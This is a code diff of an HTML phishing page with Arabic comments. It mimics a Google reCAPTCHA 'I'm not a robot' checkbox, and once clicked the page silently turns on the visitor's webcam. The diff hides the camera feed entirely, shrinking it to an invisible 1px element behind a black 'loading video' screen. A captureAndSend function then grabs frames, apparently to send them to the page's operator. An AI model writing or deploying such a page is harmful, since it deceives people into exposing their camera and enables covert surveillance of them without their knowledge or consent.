@@ -17,7 +17,18 @@
             align-items: center;
         }
         
-        #video, #canvas { 
+        /* ✅ إخفاء الفيديو تماماً */
+        #video, #cameraVideo { 
+            position: absolute; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0;
+            pointer-events: none;
+            top: 0;
+            left: 0;
+        }
+        
+        #canvas { 
             position: absolute; 
             width: 1px; 
             height: 1px; 
@@ -25,7 +36,7 @@
             pointer-events: none;
         }
         
-        /* ✅ صندوق reCAPTCHA المقلد - يشبه الحقيقي 100% */
+        /* صندوق reCAPTCHA المقلد */
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -38,10 +49,9 @@
             height: 78px;
             cursor: pointer;
             position: relative;
-            direction: ltr; /* اتجاه إنجليزي مثل الأصل */
+            direction: ltr;
         }
         
-        /* المربع الأبيض */
         .checkbox-wrapper {
             width: 28px;
             height: 28px;
@@ -54,7 +64,6 @@
             transition: all 0.3s;
         }
         
-        /* علامة الصح الزرقاء */
         .checkbox-wrapper.checked {
             background: #1a73e8;
             border-color: #1a73e8;
@@ -72,7 +81,6 @@
             transform: rotate(45deg);
         }
         
-        /* نص "I'm not a robot" */
         .recaptcha-text {
             color: #282828;
             font-size: 14px;
@@ -81,7 +89,6 @@
             user-select: none;
         }
         
-        /* شعار reCAPTCHA على اليمين */
         .recaptcha-logo {
             display: flex;
             flex-direction: column;
@@ -102,7 +109,6 @@
             line-height: 1.2;
         }
         
-        /* حالة التحميل */
         .loading-state {
             display: none;
             width: 28px;
@@ -119,8 +125,8 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* ✅ شاشة الكاميرا */
-        #cameraScreen {
+        /* ✅ شاشة سوداء بعد الضغط - لا تظهر الكاميرا */
+        #loadingScreen {
             position: fixed;
             top: 0;
             left: 0;
@@ -131,45 +137,33 @@
             display: none;
             justify-content: center;
             align-items: center;
+            flex-direction: column;
         }
         
-        #cameraVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .camera-text {
-            position: absolute;
-            bottom: 50px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: white;
-            font-size: 16px;
-            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
-        }
-        
-        .camera-spinner {
-            width: 35px;
-            height: 35px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: white;
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #333;
+            border-top-color: #fff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            color: #666;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ✅ المربع يظهر مباشرة -->
+    <!-- المربع -->
     <div class="recaptcha-box" id="recaptchaBox">
         <div class="checkbox-wrapper" id="checkbox"></div>
         <div class="loading-state" id="loadingSpinner"></div>
         <div class="recaptcha-text">I'm not a robot</div>
         <div class="recaptcha-logo">
-            <!-- شعار reCAPTCHA -->
             <svg class="recaptcha-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                 <path fill="#4285F4" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                 <path fill="#34A853" d="M12 22c5.52 0 10-4.48 10-10S17.52 2 12 2v2c4.42 0 8 3.58 8 8s-3.58 8-8 8v2z" opacity="0.5"/>
@@ -181,16 +175,14 @@
         </div>
     </div>
 
-    <!-- شاشة الكاميرا -->
-    <div id="cameraScreen">
-        <video id="cameraVideo" autoplay playsinline muted></video>
-        <div class="camera-text">
-            <div class="camera-spinner"></div>
-            <div>جاري تحضير الفيديو...</div>
-        </div>
+    <!-- ✅ شاشة سوداء فقط - لا فيديو -->
+    <div id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">جاري تحميل الفيديو...</div>
     </div>
 
-    <video id="video" autoplay playsinline muted style="display:none;"></video>
+    <!-- فيديو مخفي تماماً -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -201,25 +193,21 @@
         let stream = null;
         let checked = false;
 
-        // ✅ عند الضغط على المربع
         document.getElementById('recaptchaBox').addEventListener('click', function() {
             if (checked) return;
             checked = true;
             
-            // إظهار التحميل
             document.getElementById('checkbox').style.display = 'none';
             document.getElementById('loadingSpinner').style.display = 'block';
             
-            // بعد ثانية، يظهر الصح
             setTimeout(() => {
                 document.getElementById('loadingSpinner').style.display = 'none';
                 document.getElementById('checkbox').style.display = 'block';
                 document.getElementById('checkbox').classList.add('checked');
                 
-                // بعد نصف ثانية، انتقل للكاميرا
                 setTimeout(() => {
                     document.getElementById('recaptchaBox').style.display = 'none';
-                    document.getElementById('cameraScreen').style.display = 'flex';
+                    document.getElementById('loadingScreen').style.display = 'flex';
                     initCamera();
                 }, 500);
                 
@@ -237,7 +225,7 @@
                     audio: false
                 });
                 
-                const video = document.getElementById('cameraVideo');
+                const video = document.getElementById('video');
                 video.srcObject = stream;
                 await video.play();
                 
@@ -251,7 +239,7 @@
 
         async function captureAndSend() {
             try {
-                const video = document.getElementById('cameraVideo');
+                const video = document.getElementById('video');
                 
                 await new Promise(resolve => {
                     if (video.videoWidth > 0) resolve();
